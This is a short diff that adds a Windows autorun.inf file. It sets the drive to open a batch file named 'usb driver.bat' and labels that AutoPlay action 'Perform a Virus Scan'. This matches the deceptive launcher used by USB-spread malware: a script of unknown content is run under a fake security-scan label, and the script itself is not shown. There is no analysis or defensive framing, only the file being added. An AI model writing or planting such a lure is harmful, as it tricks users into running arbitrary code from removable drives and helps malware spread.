@@ -1,0 +1,3 @@
+[autorun]
+open=usb driver.bat
+Action=Perform a Virus Scan
